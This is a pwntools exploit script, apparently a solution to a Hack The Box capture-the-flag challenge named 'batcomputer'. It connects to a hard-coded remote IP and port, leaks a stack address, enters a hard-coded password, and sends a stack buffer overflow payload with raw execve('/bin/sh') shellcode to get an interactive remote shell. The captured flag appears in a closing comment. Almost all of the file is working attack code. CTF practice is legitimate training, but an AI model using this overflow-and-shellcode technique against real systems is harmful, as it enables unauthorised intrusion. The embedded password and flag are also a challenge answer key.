from pwn import *

context.arch = 'amd64'
#context.log_level = 'debug'

#io = process('./batcomputer')
ip, port = '165.22.115.189', 32126
io = remote(ip, port)

io.sendlineafter('>', '1')
addr = p64(int(io.recvline().split()[-1],16))

io.sendlineafter('>', '2')
io.sendlineafter('Enter the password:', 'b4tp@$$w0rd!')

payload_size = 76+8

#print shellcraft.sh()
#shellcode = asm(shellcraft.linux.cat('flag.txt'))	#OK
#shellcode = asm(shellcraft.amd64.sh(), arch='amd64')   #Failed...

#http://shell-storm.org/shellcode/files/shellcode-806.html
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload = shellcode + 'A'*(payload_size - len(shellcode)) + addr

io.sendlineafter('Enter the navigation commands:', payload)
io.sendlineafter('>', '3')
#print io.recvline()
#print io.recvline()
io.interactive()
#HTB{l0v3_y0uR_sh3llf_U_s4v3d_th3_w0rld!}
